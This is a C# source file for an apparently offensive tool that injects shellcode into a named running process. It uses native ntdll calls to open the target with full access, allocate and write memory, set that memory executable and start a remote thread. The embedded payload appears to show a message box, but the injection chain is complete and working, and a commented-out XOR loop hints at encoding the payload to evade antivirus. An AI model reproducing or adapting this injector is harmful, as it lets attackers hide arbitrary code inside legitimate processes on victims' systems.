﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NT_ProcessInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("[*] Usage: NtProcessInjection.exe <process name>");
                return;
            }

            //Shellcode
            byte[] buf = new byte[329] {
0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
0x85,0x31,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
0x20,0x57,0x6f,0x72,0x6c,0x64,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4b,0x72,0x30,
0x66,0x66,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };

            // Get a list of all processes under a specific name = notepad ?
            Process[] proc = Process.GetProcessesByName(args[0]);
            if (proc.Length < 1)
            { // Checking for one at least one process
                Console.WriteLine("[-] Process not found");
                return;
            }

            Process procId = Process.GetProcessById(proc[0].Id);

            uint scSize = (uint)buf.Length;

            // Mem Allocation types
            const int MEM_COMMIT = 0x00001000;
            const int MEM_RESERVE = 0x00002000;
            
            // Memory and process protection flags
            uint PROCESS_READWRITE = (uint)PageProtection.READWRITE;
            uint PROCESS_EXECUTE_READ = (uint)PageProtection.EXECUTE_READ;
            uint PROCESS_ALL_ACCESS = (uint)ProcessAccessFlags.ALL;
            
            // Thread handle
            IntPtr tHandle = new IntPtr();
            
            // Remote process handle and base address
            IntPtr pHandle = IntPtr.Zero;
            IntPtr baseA = IntPtr.Zero; 

            // Struct assignments 
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)procId.Id
            };

            //Zoro is below.... Z
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0x41);
            //}

            NtOpenProcess(ref pHandle, PROCESS_ALL_ACCESS, ref oa, ref ci);
            Console.WriteLine("[*] Process Handle: 0x{0}", pHandle.ToString("X"));

            NtAllocateVirtualMemory(pHandle, ref baseA, 0, ref scSize, MEM_COMMIT | MEM_RESERVE, PROCESS_READWRITE);
            Console.WriteLine("[*] Allocated memory buffer: 0x{0}", baseA.ToString("X"));

            uint outSize = 0;
            NtWriteVirtualMemory(pHandle, baseA, buf, scSize, ref outSize);
            Console.WriteLine("[*] Shellcode bytes written: 0x{0}", scSize.ToString("X"));

            // Memory protection set to Read/Execute 
            NtProtectVirtualMemory(pHandle, ref baseA, ref scSize, PROCESS_EXECUTE_READ, ref PROCESS_READWRITE);

            NtCreateThreadEx(ref tHandle, 0x0000FFFF | 0x001F0000, IntPtr.Zero, pHandle, baseA, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            ALL = 0x001F0FFF,
            PROCESS_TERMINATE = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x000000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
            SYNCHRONIZE = 0x00100000
        }

        // Memory protection constants
        [Flags]
        enum PageProtection : uint
        {
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            GUARD = 0x100,
            NOCACHE = 0x200,
            WRITECOMBINE = 0x400,
        }

        public struct OBJECT_ATTRIBUTES {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        };
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UInt32 RegionSize, UInt32 AllocationType, UInt32 Protect);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);
    }
}
